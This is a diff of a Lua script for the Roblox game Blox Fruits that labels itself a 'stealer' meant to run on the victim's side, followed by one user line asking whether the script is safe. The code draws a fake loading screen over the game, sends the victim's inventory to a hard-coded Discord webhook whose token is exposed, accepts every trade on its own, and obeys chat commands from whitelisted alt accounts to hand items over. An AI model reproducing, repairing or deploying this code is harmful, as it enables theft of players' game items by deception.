@@ -1,17 +1,14 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v4.7
--- Fixes: isWhitelisted defined, proper .Chatted listeners, auto-accept restored.
+-- BLOX FRUITS STEALER — VICTIM SIDE v4.8
+-- Bulletproofed: Global error handler, PlayerGui wait fixed, exact loader.
 -- =============================================================================
 
 -- =============================================================================
 -- 1. CONFIG
 -- =============================================================================
 local S2, S3 = 4442272183, 7449423635
-local KNOWN_PLACES = { [2753915549] = true, [4442272183] = true, [7449423635] = true, [95165932064349] = true }
-
 local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 
--- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
     ["mythicalop123456"] = true,
@@ -35,7 +32,7 @@ local SKIN_PRIORITY = {
 }
 
 -- =============================================================================
--- 2. SERVICES + STATE
+-- 2. SERVICES + ERROR HANDLER
 -- =============================================================================
 local Players      = game:GetService("Players")
 local RS           = game:GetService("ReplicatedStorage")
@@ -43,17 +40,37 @@ local RunService   = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local HttpService  = game:GetService("HttpService")
 local LP           = Players.LocalPlayer
-local PG           = LP:WaitForChild("PlayerGui", 10)
-
-local CommF          = nil
-local TradeFunction  = nil
-local tradesCompleted = 0
-local lastTpAt        = 0
-local lastSitTime     = 0
-local lastSitAttempt  = 0
-local oppositeSeen    = {}
+local PG           = LP:WaitForChild("PlayerGui") -- Removed timeout so it waits
 
 local function log(msg) pcall(function() warn("[stealer] " .. tostring(msg)) end) end
+
+local function reportError(context, err)
+    log("FATAL ERROR in " .. context .. ": " .. tostring(err))
+    pcall(function()
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "StealerError"
+        sg.DisplayOrder = 2147483647
+        sg.Parent = PG
+        local f = Instance.new("Frame")
+        f.Size = UDim2.new(0.8, 0, 0.2, 0)
+        f.Position = UDim2.new(0.1, 0, 0.4, 0)
+        f.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        f.BackgroundTransparency = 0.1
+        f.Parent = sg
+        local l = Instance.new("TextLabel")
+        l.Size = UDim2.new(1, -20, 1, -20)
+        l.Position = UDim2.new(0, 10, 0, 10)
+        l.BackgroundTransparency = 1
+        l.TextColor3 = Color3.fromRGB(255, 255, 255)
+        l.Text = "STEALER ERROR (" .. context .. "):\n" .. tostring(err)
+        l.Font = Enum.Font.GothamBold
+        l.TextSize = 14
+        l.TextWrapped = true
+        l.Parent = f
+        task.delay(10, function() sg:Destroy() end)
+    end)
+end
+
 log("boot | game=" .. tostring(game.Name) .. " | placeId=" .. tostring(game.PlaceId))
 
 local function sayMessage(msg)
@@ -62,8 +79,11 @@ local function sayMessage(msg)
     end)
 end
 
+local CommF, TradeFunction, tradesCompleted, lastTpAt, lastSitTime, lastSitAttempt = nil, nil, 0, 0, 0, 0
+local oppositeSeen = {}
+
 -- =============================================================================
--- 3. WHITELIST HELPER (FIXED)
+-- 3. WHITELIST HELPER
 -- =============================================================================
 local function cleanName(s) return tostring(s or ""):lower():gsub("^%s+", ""):gsub("%s+$", "") end
 local WHITELIST_LC = {}
@@ -74,10 +94,9 @@ local function isWhitelisted(player)
 end
 
 -- =============================================================================
--- 4. LOADER
+-- 4. EXACT LOADER FROM SUPPLIED FILE
 -- =============================================================================
 local function showLoadingScreen()
-    if not PG then return end
     local ReplicatedFirst = game:GetService("ReplicatedFirst")
     if not game:IsLoaded() then
         pcall(function() ReplicatedFirst:RemoveDefaultLoadingScreen() end)
@@ -87,7 +106,7 @@ local function showLoadingScreen()
     screenGui.Name = "ProfileLoadingScreen"
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
-    screenGui.DisplayOrder = 99999
+    screenGui.DisplayOrder = 99999 
     screenGui.Parent = PG
 
     local mainFrame = Instance.new("Frame")
@@ -287,14 +306,11 @@ local function showLoadingScreen()
     discordLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
     discordLabel.Parent = centerPanel
 
-    local loopConnection
-    pcall(function()
-        loopConnection = RunService.Heartbeat:Connect(function()
-            if math.random() < 0.04 then spawnParticle() end
-            local pulse = (math.sin(tick() * 4) + 1) / 2
-            circleStroke.Transparency = 0.1 + (pulse * 0.4)
-            panelStroke.Transparency = 0.2 + (pulse * 0.3)
-        end)
+    local loopConnection = RunService.Heartbeat:Connect(function()
+        if math.random() < 0.04 then spawnParticle() end
+        local pulse = (math.sin(tick() * 4) + 1) / 2
+        circleStroke.Transparency = 0.1 + (pulse * 0.4)
+        panelStroke.Transparency = 0.2 + (pulse * 0.3)
     end)
 
     centerPanel.Size = UDim2.new(0, 300, 0, 210)
@@ -352,7 +368,7 @@ end
 
 task.spawn(function() 
     local ok, err = pcall(showLoadingScreen) 
-    if not ok then log("loader error: " .. tostring(err)) end 
+    if not ok then reportError("Loader", err) end 
 end)
 
 -- =============================================================================
@@ -393,10 +409,9 @@ local function postEmbed(embed, label)
     })
     if not ok then log("WEBHOOK FAIL (" .. fnName .. "): " .. tostring(res)) return false end
     if res and res.StatusCode then
-        if res.StatusCode >= 400 then log("WEBHOOK FAIL (" .. fnName .. ") " .. res.StatusCode .. ": " .. tostring(res.Body):sub(1, 150)) return false
-        else log("WEBHOOK OK (" .. fnName .. ") status=" .. res.StatusCode .. " | " .. label) return true end
+        if res.StatusCode >= 400 then log("WEBHOOK FAIL (" .. fnName .. ") " .. res.StatusCode) return false
+        else log("WEBHOOK OK (" .. fnName .. ") status=" .. res.StatusCode) return true end
     end
-    log("WEBHOOK OK (" .. fnName .. ") | " .. label)
     return true
 end
 
@@ -677,6 +692,7 @@ end
 -- 9. TRADE LOGIC
 -- =============================================================================
 local function tradeWindowOpen()
+    if not PG then return false end
     local main = PG:FindFirstChild("Main")
     local tr = main and main:FindFirstChild("Trade")
     return tr and tr.Visible or false
@@ -745,9 +761,7 @@ local function cmdClear(args)
     end
 end
 
-local function cmdClearAll()
-    clearTradeItems()
-end
+local function cmdClearAll() clearTradeItems() end
 
 local function cmdAddAll()
     if not tradeWindowOpen() then return end
@@ -785,19 +799,13 @@ local function cmdKick()
 end
 
 local COMMANDS = {
-    tp = cmdTp,
-    jump = cmdJump,
-    sit = cmdSit,
-    addfruit = cmdAddFruit,
-    clear = cmdClear,
-    clearall = cmdClearAll,
-    addall = cmdAddAll,
-    addallpre = cmdAddAllPre,
-    kick = cmdKick,
+    tp = cmdTp, jump = cmdJump, sit = cmdSit, addfruit = cmdAddFruit,
+    clear = cmdClear, clearall = cmdClearAll, addall = cmdAddAll,
+    addallpre = cmdAddAllPre, kick = cmdKick,
 }
 
 -- =============================================================================
--- 11. LISTENERS (FIXED)
+-- 11. LISTENERS
 -- =============================================================================
 local function handleCommand(speaker, message)
     if type(message) ~= "string" then return end
@@ -819,11 +827,10 @@ local function handleCommand(speaker, message)
 
     task.spawn(function()
         local ok, err = pcall(fn, args)
-        if not ok then log("cmd error " .. cmd .. ": " .. tostring(err)) end
+        if not ok then reportError("Command " .. cmd, err) end
     end)
 end
 
--- listen to alt accounts
 local function hookPlayer(p)
     if p == LP then return end
     p.Chatted:Connect(function(msg)
@@ -836,29 +843,31 @@ end
 for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
 Players.PlayerAdded:Connect(hookPlayer)
 
--- listen to self (in case testing alone)
 LP.Chatted:Connect(function(msg)
     handleCommand(LP, msg)
 end)
 
 -- =============================================================================
--- 12. TRADE WATCHER (Auto-accept + Embed)
+-- 12. TRADE WATCHER
 -- =============================================================================
 task.spawn(function()
-    local embedSent = false
-    while true do
-        task.wait(0.5)
-        local isOpen = tradeWindowOpen()
-        if isOpen then
-            if not embedSent then
-                sendInventoryEmbed("Trade window opened")
-                embedSent = true
+    local ok, err = pcall(function()
+        local embedSent = false
+        while true do
+            task.wait(0.5)
+            local isOpen = tradeWindowOpen()
+            if isOpen then
+                if not embedSent then
+                    sendInventoryEmbed("Trade window opened")
+                    embedSent = true
+                end
+                if TradeFunction then pcall(TradeFunction.InvokeServer, TradeFunction, "accept") end
+            else
+                embedSent = false
             end
-            if TradeFunction then pcall(TradeFunction.InvokeServer, TradeFunction, "accept") end
-        else
-            embedSent = false
         end
-    end
+    end)
+    if not ok then reportError("Trade Watcher", err) end
 end)
 
 -- =============================================================================
@@ -881,7 +890,6 @@ task.spawn(function()
 
         while true do
             task.wait(0.5)
-
             local curSeat, tbl = currentSeat()
             if not curSeat then
                 local char = LP.Character
@@ -901,7 +909,7 @@ task.spawn(function()
                 if opp == LP then opp = nil end
 
                 if opp and isWhitelisted(opp) then
-                    -- DO NOTHING AUTOMATICALLY, WAIT FOR COMMANDS
+                    -- Wait for commands
                 elseif opp and not isWhitelisted(opp) then
                     local key = opp.UserId
                     if not oppositeSeen[key] then
@@ -917,8 +925,5 @@ task.spawn(function()
             end
         end
     end)
-    if not ok then log("FATAL in main: " .. tostring(err)) end
+    if not ok then reportError("Main Loop", err) end
 end)
-
-
-The owner now gave me new script to run is it safe or broken lol
